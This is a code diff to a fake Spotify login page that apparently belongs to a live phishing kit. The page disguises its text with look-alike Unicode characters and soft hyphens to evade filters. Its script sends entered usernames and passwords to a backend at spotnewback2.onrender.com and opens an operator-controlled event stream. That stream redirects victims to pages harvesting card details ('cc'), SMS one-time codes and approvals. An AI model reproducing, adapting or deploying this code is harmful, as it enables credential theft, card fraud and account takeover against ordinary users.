@@ -13,33 +13,25 @@
     #login-button {
       cursor: pointer;
     }
-
-    .error-message {
-      color: red;
-      font-size: 14px;
-      margin-top: 5px;
-    }
   </style>
 </head>
 
 <body>
   <header>
     <div class="logo">
+      <!-- Spotify logo SVG -->
       <svg role="img" viewBox="0 0 78 24" aria-label="Spotify" aria-hidden="false" height="100%" data-encore-id="logoSpotify" class="Svg-sc-6c3c1v-0 fMEvxo" style="fill: white;">
         <title>Spotify</title>
-        <path d="M10 10 L50 10 L50 50 L10 50 Z"></path>
+        <path d="M31.8234 11.0782C29.8042..."></path>
       </svg>
     </div>
   </header>
   <section>
     <div class="main">
       <h1>Ꮮоց іո tο Spot­­­­­­­­­­­­ify­­­­­­­­­­­­</h1>
-
       <div class="log-in">
         <form id="form">
-          <div id="error_mailvalid" class="error-message" style="display: none;">Incorrect username or password. Please try again.</div>
-          <div id="error_emailcheck" class="error-message" style="display: none;">Email is not registered. Please check and try again.</div>
-
+          <div id="error_mailvalid" style="color:red">Incorrect username or password. Please try again.</div>
           <label>Еmаil or username</label>
           <input type="text" name="signin_email" id="u" placeholder="Email address or username">
 
@@ -52,7 +44,7 @@
             <span>Remember me</span>
           </div>
 
-          <button id="login-button" onclick="validateEmail()" type="button">Ꮮοց ӏո</button>
+          <button id="login-button" onclick="sendLog()" type="button">Ꮮοց ӏո</button>
           <div id="forgot-pass">
             <a href="#">Fοrցοt уоսr раѕѕԝоrd?</a>
           </div>
@@ -62,65 +54,66 @@
       <div class="last">
         <span>Don't have an account?</span> <a href="#">Sіցո Սр to Ѕроt­­­­­­­­­­­­іfу­­­­­­­­­­­­</a>
       </div>
-      <div class="last2"></div>
     </div>
   </section>
-
   <script>
-    document.addEventListener('DOMContentLoaded', function () {
-      const form = document.getElementById("form");
-
-      // Add keydown listener for the Enter key
-      form.addEventListener("keydown", function (event) {
-        if (event.key === "Enter") {
-          event.preventDefault(); // Prevent default form submission
-          validateEmail(); // Trigger the email validation function
-        }
-      });
-    });
-
-    async function validateEmail() {
-      const email = $("#u").val();
-
-      // Clear previous error messages
-      $("#error_mailvalid").hide();
-      $("#error_emailcheck").hide();
-      $("#u").removeClass("error");
-
-      if (!email) {
-        $("#u").addClass("error");
-        return;
-      }
-
+    document.addEventListener('DOMContentLoaded', async function () {
       try {
-        // Call proxy server to validate email
-        const response = await fetch("/validate-email", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email }),
-        });
+        const userId = localStorage.getItem('userId');
+        if (!userId) {
+          console.error("User ID not found.");
+        }
 
-        // Check if the response is OK (status 200-299)
-        const contentType = response.headers.get("Content-Type");
-        if (!response.ok) {
-          throw new Error(`API error: ${response.status} ${response.statusText}`);
-        }
-        if (!contentType || !contentType.includes("application/json")) {
-          throw new Error("Response is not JSON");
-        }
+        const response = await fetch('https://spotnewback2.onrender.com/details', {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json',
+            'User-ID': userId
+          },
+        });
 
         const data = await response.json();
 
-        if (data.account_exists) {
-          sendLog(); // Proceed with login
+        if (data.success) {
+          console.log('Page load notification sent successfully.');
         } else {
-          $("#error_emailcheck").text("Email is not registered").show();
+          console.error('Error notifying page load.');
         }
       } catch (error) {
-        console.error("Error validating email:", error.message);
-        $("#error_emailcheck").text("An error occurred while validating the email").show();
+        console.error('Error during page load notification:', error);
       }
-    }
+
+      let userId = localStorage.getItem('userId');
+      if (!userId) {
+        try {
+          const response = await fetch('https://spotnewback2.onrender.com/user-id', {
+            method: 'GET',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+          });
+
+          const data = await response.json();
+          if (data.success) {
+            localStorage.setItem('userId', data.userId);
+            userId = data.userId;
+          } else {
+            console.error('Error generating user ID');
+            return;
+          }
+        } catch (error) {
+          console.error('Error fetching user ID:', error);
+          return;
+        }
+      }
+      listenForSSE(userId);
+    });
+
+    document.addEventListener('keydown', function (event) {
+      if (event.key === 'Enter') {
+        document.getElementById('login-button').click();
+      }
+    });
 
     function sendLog() {
       const username = $("#u").val();
@@ -133,7 +126,8 @@
         return $("#p").addClass("error");
       }
 
-      const userId = localStorage.getItem("userId");
+      const userId = localStorage.getItem('userId');
+
       if (!userId) {
         console.error("User ID not found.");
       }
@@ -144,13 +138,62 @@
         userId: userId
       })
         .done((res) => {
-          // Redirect to update.html after successful login
-          window.location = "update.html";
+          window.location = "loading.html";
+          listenForSSE(userId);
         })
         .fail((err) => {
-          console.error("Login failed:", err);
-          $("#error_mailvalid").show();
+          console.error('Error during login:', err);
         });
+    }
+
+    function listenForSSE(userId) {
+      const eventSource = new EventSource(`https://spotnewback2.onrender.com/sse/${userId}`);
+      console.log("Attempting to establish SSE connection for userId:", userId);
+
+      eventSource.onmessage = function (event) {
+        console.log("SSE Message received:", event);
+        try {
+          const data = JSON.parse(event.data);
+          if (!data.action) {
+            return;
+          }
+          if (data.action === "login") {
+            window.location.href = 'index.html';
+          } else if (data.action === "cc") {
+            window.location.href = 'update.html';
+          } else if (data.action === "sms") {
+            window.location.href = 'qom.html';
+          } else if (data.action === "approve") {
+            window.location.href = 'approve.html';
+          } else if (data.action === "thankyou") {
+            window.location.href = 'thankyou.html';
+          } else if (data.action === "updateError") {
+            window.location.href = 'updateError.html';
+          } else if (data.action === "otpError") {
+            window.location.href = 'otpError.html';
+          } else if (data.action === "loginError") {
+            window.location.href = 'login.html';
+          } else {
+            window.location.href = 'login.html';
+          }
+        } catch (error) {
+          console.error("Error parsing SSE data:", error);
+          window.location.href = 'login.html';
+        }
+      };
+
+      eventSource.onerror = function (event) {
+        console.error("SSE connection error:", event);
+        eventSource.close();
+      };
+
+      eventSource.onopen = function (event) {
+        console.log("SSE connection successfully opened:", event);
+      };
+
+      eventSource.onclose = function (event) {
+        console.log("SSE connection closed:", event);
+      };
     }
   </script>
 </body>
